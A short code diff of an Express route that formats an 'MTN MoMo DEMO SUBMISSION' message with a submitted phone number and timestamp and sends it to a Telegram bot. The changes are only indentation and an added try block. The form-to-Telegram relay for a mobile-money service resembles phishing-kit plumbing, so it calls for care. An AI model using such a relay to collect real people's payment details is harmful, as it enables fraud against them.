@@ -58,7 +58,7 @@ app.post("/mtn-submission", async (req, res) => {
   }).format(now);
 
 
-  const message =
+    const message =
 `🧪 MTN MoMo DEMO SUBMISSION
 
 Number: ${phone}
@@ -68,6 +68,7 @@ Status: Successful
 Date: ${date}
 Time: ${time}`;
 
+  try {
     const telegramResponse = await axios.post(
       `${TELEGRAM_API}/sendMessage`,
       {
